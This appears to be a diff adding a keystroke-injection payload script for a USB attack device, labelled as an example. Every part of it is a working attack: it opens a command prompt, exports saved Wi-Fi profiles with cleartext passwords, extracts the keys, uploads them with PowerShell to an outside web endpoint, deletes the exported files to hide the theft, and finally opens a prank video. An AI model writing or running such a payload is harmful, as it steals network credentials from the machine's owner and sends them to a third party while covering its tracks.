@@ -1,0 +1,35 @@
+REM This is an example of a payload file
+
+REM Setup
+HOTKEY GUI R
+DELAY 300
+STRING cmd /k
+PRESS ENTER
+DELAY 300
+STRING cd %temp%
+PRESS ENTER
+DELAY 300
+
+REM Wifi Exfil
+STRING netsh wlan export profile key=clear > nul
+PRESS ENTER
+DELAY 300
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS
+PRESS ENTER
+DELAY 300
+STRING powershell iwr -Uri https://q4n5n8j7oj.execute-api.us-east-1.amazonaws.com/default/data -Method POST -InFile WiFi-PASS > nul
+PRESS ENTER
+DELAY 300
+STRING del WiFi*
+PRESS ENTER
+DELAY 300
+STRING del Wi-Fi*
+PRESS ENTER
+DELAY 300
+
+REM Rickroll
+STRING start https://youtu.be/dQw4w9WgXcQ
+PRESS ENTER
+DELAY 100
+STRING exit
+PRESS ENTER
